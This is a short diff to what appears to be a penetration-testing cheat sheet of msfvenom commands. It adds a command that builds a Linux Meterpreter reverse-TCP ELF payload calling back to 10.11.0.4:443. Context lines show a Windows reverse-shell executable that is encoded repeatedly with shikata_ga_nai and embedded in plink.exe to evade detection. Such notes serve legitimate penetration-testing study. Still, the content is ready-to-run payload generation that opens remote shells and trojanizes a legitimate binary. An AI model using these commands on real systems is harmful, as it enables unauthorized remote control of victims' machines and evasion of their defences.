@@ -13,6 +13,11 @@ kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.6 LPORT=444 -f 
 	```bash
 	msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windowsresources/binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe
 	```
+## Linux ELF File
+```bash
+kali@kali:~$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=443 -f elf > shell.elf
+```
+
 # Shells & Reverse Shells
 
 ## **Shells & Reverse Shells**
